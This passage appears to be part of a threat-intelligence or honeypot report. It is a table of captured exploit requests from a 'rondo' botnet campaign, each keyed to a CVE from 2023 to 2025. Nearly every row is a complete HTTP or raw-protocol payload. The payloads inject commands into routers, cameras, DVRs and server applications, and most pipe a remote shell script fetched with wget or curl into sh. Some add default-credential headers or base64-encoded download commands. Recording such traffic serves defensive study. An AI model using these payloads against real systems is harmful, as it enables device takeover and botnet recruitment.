<tr><td>CVE-2023-34960</td><td><pre><code>POST /main/webservices/additional_webservices.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: text/xml; charset=utf-8

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:ns2=&quot;http://xml.apache.org/xml-soap&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:wsConvertPpt&gt;&lt;param0 xsi:type=&quot;ns2:Map&quot;&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;file_data&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;&lt;/value&gt;&lt;/item&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;file_name&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;\`{{}}\`.pptx&#x27;|&quot; |(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.qvy.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.qvy.sh)|sh||a #&lt;/value&gt;&lt;/item&gt;&lt;item&gt;&lt;key xsi:type=&quot;xsd:string&quot;&gt;service_ppt2lp_size&lt;/key&gt;&lt;value xsi:type=&quot;xsd:string&quot;&gt;720x360&lt;/value&gt;&lt;/item&gt;&lt;/param0&gt;&lt;/ns1:wsConvertPpt&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2023-45852</td><td><pre><code>POST /cgi-bin/vitogate.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;method&quot;:&quot;put&quot;,&quot;form&quot;:&quot;form-4-8&quot;,&quot;session&quot;:&quot;&quot;,&quot;params&quot;:{&quot;ipaddr&quot;:&quot;1;&lt;REDACTED_IP&gt;&quot;}}</code></pre></td></tr>
<tr><td>CVE-2023-46604</td><td><pre><code>\x00\x00\x00q\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00Borg.springframework.context.support.ClassPathXmlApplicationContext\x01\x00\x1ehttp://&lt;REDACTED_IP&gt;/rondo.xml</code></pre></td></tr>
<tr><td>CVE-2023-47565</td><td><pre><code>POST /cgi-bin/server/server.cgi?func=server02_main_submit&amp;counter=5.22497857400916&amp;TEST_BTN4= HTTP/1.0
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;:8080/cgi-bin/server/server.cgi?func=server02_main_submit&amp;counter=6.7496022225883&amp;TEST_BTN4=
Authorization: Basic YWRtaW46YWRtaW4=

time_mode=0&amp;time_YEAR=0&amp;time_MONTH=0&amp;time_DAY=0&amp;time_HOUR=0&amp;time_MINUTE=0&amp;time_SECOND=0&amp;TIMEZONE=50&amp;year=&amp;month=&amp;day=&amp;CONFIGURE_NTP=on&amp;SPECIFIC_SERVER=$(wget -O- http://&lt;REDACTED_IP&gt;/rondo.qbq.sh|sh;)&amp;CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&amp;SYNC_PRESET_TIME_HOURS=0</code></pre></td></tr>
<tr><td>CVE-2023-52163</td><td><pre><code>POST /cgi-bin/cgi_main.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;/cfg_system_time.htm
Authorization: Basic YWRtaW46YWRtaW4=

cgiName=time_tzsetup.cgi&amp;page=/cfg_system_time.htm&amp;id=69&amp;ntp=\`curl -s http://&lt;REDACTED_IP&gt;/rondo.qyt.sh|sh;\`&amp;ntp1=time.stdtime.gov.tw&amp;ntp2=\`curl -s http://&lt;REDACTED_IP&gt;/rondo.qyt.sh|sh;\`&amp;isEnabled=0&amp;timeDiff=+9&amp;ntpAutoSync=1&amp;ntpSyncMode=1&amp;day=0&amp;hour=0&amp;min=0&amp;syncDiff=30</code></pre></td></tr>
<tr><td>CVE-2023-7311</td><td><pre><code>GET /goform/webRead/open/?path=|wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wtf.sh|sh HTTP/1.0
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)

</code></pre></td></tr>
<tr><td>CVE-2024-10804</td><td><pre><code>GET /downloader.php?file=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.ftm.sh|sh\x00.zip HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2024-10914</td><td><pre><code>GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&amp;name=&#x27;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.djc.sh|sh;&#x27; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2024-11120</td><td><pre><code>POST /DateSetting.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded

dwTimeZone=2&amp;dwGainType=0&amp;szSrvIpAddr=time.windows.com;$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.vgz.sh|sh)&amp;NTP_Update_time_hh=5&amp;NTP_Update_time_mm=10&amp;szDateM=2024/08/07&amp;szTimeM=14:25:16&amp;bDateFomat=0&amp;bDateFormatMisc=0&amp;dwIsDelay=1&amp;Montype=0&amp;submit=Apply</code></pre></td></tr>
<tr><td>CVE-2024-12847</td><td><pre><code>GET /setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=cd /tmp;rm -rf rondo;wget -O rondo http://&lt;REDACTED_IP&gt;/rondo.mips;chmod 777 rondo;./rondo netgear.mips;echo &amp;curpath=/&amp;currentsetting.htm=1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2024-12856</td><td><pre><code>POST /apply.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Basic ZmZhZG1pbjpmZmFkbWluZmY=

adj_time_sec=32&amp;change_action=gozila_cgi&amp;adj_time_day=27&amp;adj_time_mon=10&amp;adj_time_hour=11&amp;adj_time_year=$(killall -9 mipsel mpsl;(wget -O- http://&lt;REDACTED_IP&gt;/rondo.sh||busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.sh||curl http://&lt;REDACTED_IP&gt;/rondo.sh) | sh -s faith.80;echo )&amp;adj_time_min=35&amp;submit_button=index&amp;action=Save&amp;submit_type=adjust_sys_time</code></pre></td></tr>
<tr><td>CVE-2024-14007</td><td><pre><code>POST /editBlackAndWhiteList HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Connection: close
Accept: */*
Content-Length: 609
Content-Type: text/xml
Authorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;request version=&quot;1.0&quot; systemType=&quot;NVMS-9000&quot; clientType=&quot;WEB&quot;&gt;&lt;types&gt;&lt;filterTypeMode&gt;&lt;enum&gt;refuse&lt;/enum&gt;&lt;enum&gt;allow&lt;/enum&gt;&lt;/filterTypeMode&gt;&lt;addressType&gt;&lt;enum&gt;ip&lt;/enum&gt;&lt;enum&gt;iprange&lt;/enum&gt;&lt;enum&gt;mac&lt;/enu</code></pre></td></tr>
<tr><td>CVE-2024-27348</td><td><pre><code>POST /gremlin HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;gremlin&quot;:&quot;Thread AbCdEf=Thread.currentThread();Class GhIjKl=Class.forName(\&quot;java.lang.Thread\&quot;);java.lang.reflect.Field MnOpQr=GhIjKl.getDeclaredField(\&quot;name\&quot;);MnOpQr.setAccessible(true);MnOpQr.set(AbCdEf,\&quot;AbCdEf\&quot;);Class processBuilderClass=Class.forName(\&quot;java.lang.ProcessBuilder\&quot;);java.lang.reflect.Constructor StUvWx=processBuilderClass.getConstructor(java.util.List.class);java.util.List YzAbCd=java.util.Arrays.asList(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;{echo,d2dldCAtcU8tIGh0dHA6Ly80MS4yMzEuMzcuMTUzL3JvbmRvLm10Zy5zaHxzaA==}|{base64,-d}|bash\&quot;);Object EfGhIj=StUvWx.newInstance(YzAbCd);java.lang.reflect.Method KlMnOp=processBuilderClass.getMethod(\&quot;start\&quot;);KlMnOp.invoke(EfGhIj);&quot;,&quot;bindings&quot;:{},&quot;language&quot;:&quot;gremlin-groovy&quot;,&quot;aliases&quot;:{}}</code></pre></td></tr>
<tr><td>CVE-2024-30891</td><td><pre><code>GET /goform/exeCommand?cmdinput=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.uzz.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)

</code></pre></td></tr>
<tr><td>CVE-2024-3721</td><td><pre><code>POST /device.rsp?opt=sys&amp;cmd=___S_O_S_T_R_E_A_MAX___&amp;mdb=sos&amp;mdc=busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.ebj.sh|sh&amp;echo  HTTP/1.0
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Cookie: uid=1

</code></pre></td></tr>
<tr><td>CVE-2024-4582</td><td><pre><code>ZZ\xfffdU\xfffd0\x00\x00\xfffd\x03\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00G\x01\x00\x00&lt;?xml version=&quot;1.0&quot; ?&gt;\x0a        &lt;Message Version=&quot;1&quot;&gt;\x0a            &lt;Header&gt;\x0a                &lt;ntp_cfg ntp_srv=&quot;\`busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xba.sh|sh\`&quot; ntp_enable=&quot;1&quot; interval=&quot;86400&quot; tz_hour=&quot;0&quot; tz_minute=&quot;0&quot; /&gt;\x0a                                   &lt;/Header&gt;\x0a                               &lt;/Message&gt;\x0a                               \x00</code></pre></td></tr>
<tr><td>CVE-2024-53944</td><td><pre><code>POST /goform/formJsonAjaxReq HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json
Cookie: userLanguage=EN; username=admin
Referer: http://&lt;REDACTED_IP&gt;:8080/home.asp

{&quot;action&quot;:&quot;set_online&quot;,&quot;data&quot;:{&quot;agree&quot;:1,&quot;check_ip1&quot;:&quot;&lt;REDACTED_IP&gt;&quot;,&quot;check_ip2&quot;:&quot;$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.cgc.sh|sh)&quot;,&quot;enable&quot;:1,&quot;interval&quot;:&quot;10&quot;,&quot;reboot_interval&quot;:&quot;30&quot;}}</code></pre></td></tr>
<tr><td>CVE-2024-7120</td><td><pre><code>GET /vpn/list_base_config.php?type=mod&amp;parts=base_config&amp;template=\`wget -O- http://&lt;REDACTED_IP&gt;/rondo.pgb.sh|sh;\` HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2024-9001</td><td><pre><code>POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Referer: http://&lt;REDACTED_IP&gt;/advance/parental.html

{&quot;mtkhnatEnable&quot;:&quot;\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.cdz.sh|sh;\`&quot;,&quot;topicurl&quot;:&quot;setMtknatCfg&quot;,&quot;token&quot;:&quot;ff353795b31b41ad1904954427651f61&quot;}</code></pre></td></tr>
<tr><td>CVE-2024-9644</td><td><pre><code>POST /bapply.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8088
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;:8088/bapply.cgi
Authorization: Basic ZmZhZG1pbjpmZmFkbWluZmY=

action=ApplyTake&amp;change_action=gozila_cgi&amp;del_value=&amp;next_page=Diagnostics.asp&amp;ping_ip=busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.gvt.sh|sh&amp;&amp;submit_button=Ping&amp;submit_type=start</code></pre></td></tr>
<tr><td>CVE-2025-1316</td><td><pre><code>POST /camera-cgi/admin/param.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;/ntp.asp?r=20140408_1683324821461
Authorization: Basic YWRtaW46MTIzNA==

action=update&amp;ipcamSource=/ntp.asp?r=20130724&amp;NTP_enable=1&amp;NTP_serverName=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dcd.sh|sh\`&amp;NTP_tzCityNo=16&amp;NTP_tzMinute=0&amp;NTP_daylightSaving=0</code></pre></td></tr>
<tr><td>CVE-2025-20281</td><td><pre><code>POST /ers/sdk#_ HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/json

{&quot;InternalUser&quot;:{&quot;changePassword&quot;:false,&quot;name&quot;:&quot;pwn;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh; #&quot;,&quot;password&quot;:&quot;x&quot;}}</code></pre></td></tr>
<tr><td>CVE-2025-24016</td><td><pre><code>POST /security/user/authenticate/run_as HTTP/1.1
Host: &lt;REDACTED_IP&gt;:55000
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/json
Authorization: Basic d2F6dXcta3dpTUltUzNjcjM3UDA1MHItOg==

{&quot;__unhandled_exc__&quot;:{&quot;__args__&quot;:[&quot;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.jqx.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.jqx.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.jqx.sh)|sh&amp;&quot;],&quot;__class__&quot;:&quot;os.system&quot;}}&quot;</code></pre></td></tr>
<tr><td>CVE-2025-24893</td><td><pre><code>GET /xwiki/bin/get/Main/SolrSearch?media=rss&amp;text={{async async=false}}{{groovy}}[&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.sdu.sh|sh&#x27;].execute().text{{/groovy}}{{/async}} HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2025-32756</td><td><pre><code>POST /remote/hostcheck_validate HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded

ajax=1&amp;username=test&amp;realm=&amp;enc=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh</code></pre></td></tr>
<tr><td>CVE-2025-34029</td><td><pre><code>POST /goform/formSysCmd HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Cookie: language=1
Authorization: Basic YWRtaW46MTIzNA==

sysCmd=&quot;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dcd.sh|sh&quot;</code></pre></td></tr>
<tr><td>CVE-2025-34036</td><td><pre><code>GET /language/Swedish${IFS}&amp;&amp;wget${IFS}-O-${IFS}http://&lt;REDACTED_IP&gt;/rondo.zcb.sh|sh&amp;&amp;tar${IFS}/string.js HTTP/1.0
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2025-34037</td><td><pre><code>POST /tmUnblock.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded

submit_button=&amp;change_action=&amp;action=&amp;commit=0&amp;ttcp_num=2&amp;ttcp_size=2&amp;ttcp_ip=-h \`(busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.linksys.sh||wget -O- http://&lt;REDACTED_IP&gt;/rondo.linksys.sh||curl http://&lt;REDACTED_IP&gt;/rondo.linksys.sh)|sh;echo \`&amp;StartEPI=1</code></pre></td></tr>
<tr><td>CVE-2025-34043</td><td><pre><code>GET /board.cgi?cmd=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dcn.sh|sh; HTTP/1.0
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2025-34051</td><td><pre><code>GET /cgi-bin/nobody/Search.cgi?action=cgi_query&amp;ip=google.com&amp;port=80&amp;queryb64str=Lw==&amp;username=admin ;XmlAp r Account.User1.Password&gt;$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.cye.sh|sh;)&amp;password=admin HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2025-34117</td><td><pre><code>AAAAAAAAnetcore \x00\x0a</code></pre></td></tr>
<tr><td>CVE-2025-34129</td><td><pre><code>POST /dvr/cmd HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: text/xml
Authorization: Basic YWRtaW46MTExMQ==

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;DVR Platform=&quot;Hi3520&quot;&gt;&lt;SetConfiguration File=&quot;service.xml&quot;&gt;&lt;![CDATA[&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;DVR Platform=&quot;Hi3520&quot;&gt;&lt;Service&gt;&lt;NTP Enable=&quot;True&quot; Interval=&quot;20000&quot; Server=&quot;time.nist.gov&amp;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.tkg.sh|sh;echo &quot;/&gt;&lt;/Service&gt;&lt;/DVR&gt;]]&gt;&lt;/SetConfiguration&gt;&lt;/DVR&gt;</code></pre></td></tr>
<tr><td>CVE-2025-37164</td><td><pre><code>PUT /rest/id-pools/executeCommand HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;cmd&quot;:&quot;sh -c (wget${IFS}-qO-\${IFS}http://&lt;REDACTED_IP&gt;/rondo.mtg.sh||busybox${IFS}wget${IFS}-qO-\${IFS}http://&lt;REDACTED_IP&gt;/rondo.mtg.sh||curl${IFS}-s${IFS}http://&lt;REDACTED_IP&gt;/rondo.mtg.sh)|sh&quot;,&quot;result&quot;:false}</code></pre></td></tr>
<tr><td>CVE-2025-3987</td><td><pre><code>POST /boafrm/formWsc HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://&lt;REDACTED_IP&gt;:8080/wlwps.htm

submit-url=/wlwps.htm&amp;resetUnCfg=0&amp;localPin=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.cdz.sh|sh\`&amp;targetAPMac=&amp;targetAPSsid=&amp;peerPin=&amp;configVxd=off&amp;resetRptUnCfg=0&amp;peerRptPin=</code></pre></td></tr>
<tr><td>CVE-2025-4008</td><td><pre><code>GET /public/template.cgi?templatefile=$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xbm.sh|sh;) HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2025-47812</td><td><pre><code>POST /loginok.html HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: client_lang=english
Referer: http://&lt;REDACTED_IP&gt;/login.html?lang=english

username=anonymous\x00]]\x0dlocal+h+=+io.popen(&quot;(wget -O- http://&lt;REDACTED_IP&gt;/rondo.wing.sh||busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.wing.sh||curl http://&lt;REDACTED_IP&gt;/rondo.wing.sh) | sh&quot;)\x0dlocal+r+=+h:read(&quot;*a&quot;)\x0dh:close()\x0dprint(r)\x0d--&amp;password=</code></pre></td></tr>
<tr><td>CVE-2025-48827</td><td><pre><code>POST /ajax/api/ad/replaceAdTemplate HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

routestring=ajax/api/ad/replaceAdTemplate&amp;styleid=1&amp;location=qualystru&amp;template=&lt;vb:if+condition=&#x27;&quot;passthru&quot;(&quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.qzj.sh|sh&quot;)&#x27;&gt;&lt;/vb:if&gt;</code></pre></td></tr>
<tr><td>CVE-2025-52089</td><td><pre><code>GET /cgi-bin/d.cgi?act=1&amp;fname=&amp;cmd=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.cdz.sh|sh&amp;aaksjdkfj=#notenoughmineral^ HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2025-55182</td><td><pre><code>POST / HTTP/1.1
Host: &lt;REDACTED_IP&gt;:3000
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: multipart/form-data; boundary=0fdf55df9e085737676f582ed4e95a02

--0fdf55df9e085737676f582ed4e95a02
Content-Disposition: form-data; name=&quot;0&quot;

{&quot;then&quot;:&quot;$1:__proto__:then&quot;,&quot;status&quot;:&quot;resolved_model&quot;,&quot;reason&quot;:-1,&quot;value&quot;:&quot;{\&quot;then\&quot;:\&quot;$B1337\&quot;}&quot;,&quot;_response&quot;:{&quot;_prefix&quot;:&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqu.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqu.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.aqu.sh)|sh&amp;&#x27;);&quot;,&quot;_chunks&quot;:&quot;$Q2&quot;,&quot;_formData&quot;:{&quot;get&quot;:&quot;$1:constructor:constructor&quot;}}}
--0fdf55df9e085737676f582ed4e95a02
Content-Disposition: form-data; name=&quot;1&quot;

&quot;$@0&quot;
--0fdf55df9e085737676f582ed4e95a02
Content-Disposition: form-data; name=&quot;2&quot;

[]
--0fdf55df9e085737676f582ed4e95a02--
</code></pre></td></tr>
<tr><td>CVE-2025-57296</td><td><pre><code>POST /goform/SetIPTVCfg HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw
Referer: http://&lt;REDACTED_IP&gt;/iptv.html?random=0.7642888131213508&amp;

stbEn=1&amp;igmpEn=1&amp;vlanId=1&quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.uzz.sh|sh \&quot;\</code></pre></td></tr>
<tr><td>CVE-2025-62593</td><td><pre><code>POST /api/jobs/ HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8265
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;entrypoint&quot;: &quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wns.sh|sh&quot;}</code></pre></td></tr>
<tr><td>CVE-2025-6896</td><td><pre><code>GET /wget_test.asp?url=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh\`&amp;count=1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Cookie: userid=admin; gw_userid=admin,gw_passwd=6B426544FD5BACCE66B00364EA3945AF

</code></pre></td></tr>
<tr><td>CVE-2025-7414</td><td><pre><code>POST /goform/setPingInfo HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: O3V2.0_user=admin
Referer: http://&lt;REDACTED_IP&gt;:8080/index.html

pingMode=tranceroute&amp;action=&amp;hop=1&amp;domain=\`busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.uzz.sh|sh\`&amp;ip=&amp;packetSize=&amp;pro_ver=&amp;timeout=</code></pre></td></tr>
<tr><td>CVE-2025-7673</td><td><pre><code>GET /bin/zhttpd/${IFS}wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.cay.sh|sh;

</code></pre></td></tr>
<tr><td>CVE-2025-7769</td><td><pre><code>POST /cgi-bin/mobile_api HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json

{&quot;cmd&quot;:&quot;DEVICE_PING;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.fzr.sh|sh&quot;,&quot;dev&quot;:2,&quot;ver&quot;:1}</code></pre></td></tr>
<tr><td>CVE-2025-8937</td><td><pre><code>POST /boafrm/formSysCmd HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded

sysCmd=wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rbv.sh|sh&amp;apply=Apply&amp;msg=</code></pre></td></tr>
<tr><td>CVE-2025-9528</td><td><pre><code>POST /goform/SystemCommand HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46YWRtaW4=

command=busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.qyz.sh|sh&amp;&amp;SystemCommandSubmit=Apply</code></pre></td></tr>
<tr><td>D-Link DIR-645 / DIR-815</td><td><pre><code>POST /diagnostic.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded

act=ping&amp;dst=\` wget -qO- http://&lt;REDACTED_IP&gt;/rondo.npe.sh|sh\`</code></pre></td></tr>
<tr><td>Docker RCE</td><td><pre><code>GET /containers/json HTTP/1.1
Host: &lt;REDACTED_IP&gt;:2375
